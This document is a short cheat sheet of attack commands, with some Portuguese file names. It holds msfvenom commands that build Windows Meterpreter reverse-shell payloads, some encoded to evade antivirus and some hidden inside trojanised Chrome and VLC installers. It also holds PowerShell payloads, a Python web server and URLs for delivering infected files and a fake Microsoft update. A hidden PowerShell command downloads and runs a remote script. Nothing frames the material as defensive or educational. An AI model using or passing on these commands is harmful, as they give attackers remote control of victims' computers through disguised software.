msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.137 LPORT=443 -f exe -x ChromeSetup.exe -o chrome_infectado.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.137 LPORT=4444 -f exe > atibaia_payload.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<seu_ip> LPORT=443 -f exe -x vlc_setup.exe -o vlc_infectado.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.137 LPORT=4444 -f psh > payload.ps1

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe > trojan.exe


python3 -m http.server 8080

http://192.168.1.137:8080/vlc_infectado.exe

http://192.168.1.137:8080/documento_infectado.rtf

http://192.168.1.137:8080/microsoft_update.page.zip

http://192.168.1.137/payload.ps1

powershell.exe -WindowStyle Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.137/payload.ps1')"



 
